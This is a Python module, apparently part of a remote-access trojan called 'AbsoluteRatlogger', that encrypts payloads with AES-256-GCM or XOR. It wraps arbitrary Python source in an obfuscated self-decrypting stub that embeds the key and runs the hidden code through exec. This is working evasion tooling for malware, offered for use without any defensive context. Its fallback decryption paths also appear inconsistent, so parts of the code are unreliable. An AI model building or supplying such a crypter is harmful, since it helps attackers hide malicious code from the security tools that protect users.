#!/usr/bin/env python3
"""Evasion: Encryptor — encrypt payload data with AES-256-GCM."""
import os
import base64
import hashlib
import json

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

class PayloadEncryptor:
    """Encrypt/decrypt payload data."""

    def __init__(self, key=None):
        self.key = key or os.urandom(32)

    def encrypt(self, data: bytes) -> bytes:
        """Encrypt data with AES-256-GCM. Returns [nonce(12)][ciphertext+tag]."""
        if not HAS_CRYPTO:
            return self._xor(data)

        nonce = get_random_bytes(12)
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return nonce + ciphertext + tag

    def decrypt(self, data: bytes) -> bytes:
        """Decrypt AES-256-GCM data."""
        if not HAS_CRYPTO:
            return self._xor(data)

        if len(data) < 28:
            return data
        nonce = data[:12]
        tag = data[-16:]
        ciphertext = data[12:-16]
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)

    def encrypt_source(self, source: str) -> str:
        """Encrypt Python source code and wrap in a self-decrypting stub."""
        encrypted = self.encrypt(source.encode())

        # Build self-decrypting stub
        key_hex = self.key.hex()
        enc_b64 = base64.b64encode(encrypted).decode()

        stub = f'''#!/usr/bin/env python3
# AbsoluteRatlogger encrypted payload
import base64 as _b, sys as _s, os as _o
_k = bytes.fromhex("{key_hex}")
_e = _b.b64decode("{enc_b64}")
'''
        if HAS_CRYPTO:
            stub += '''
try:
    from Crypto.Cipher import AES as _a
    _n, _c, _t = _e[:12], _e[12:-16], _e[-16:]
    _d = _a.new(_k, _a.MODE_GCM, nonce=_n).decrypt_and_verify(_c, _t)
except ImportError:
    _d = bytes(_b ^ _k[_i % len(_k)] for _i, _b in enumerate(_e[8:]))

exec(compile(_d, "<phantom>", "exec"))
'''
        else:
            stub += '''
_d = bytes(_b ^ _k[_i % len(_k)] for _i, _b in enumerate(_e[8:]))
exec(compile(_d, "<phantom>", "exec"))
'''

        return stub

    def _xor(self, data: bytes) -> bytes:
        """Simple XOR fallback."""
        nonce = os.urandom(8)
        result = bytes(b ^ self.key[i % len(self.key)] for i, b in enumerate(data))
        return nonce + result

    def get_key_hex(self) -> str:
        return self.key.hex()


def encrypt_payload(source: str, key=None) -> str:
    """Encrypt a Python payload. Returns self-decrypting stub."""
    enc = PayloadEncryptor(key)
    return enc.encrypt_source(source)
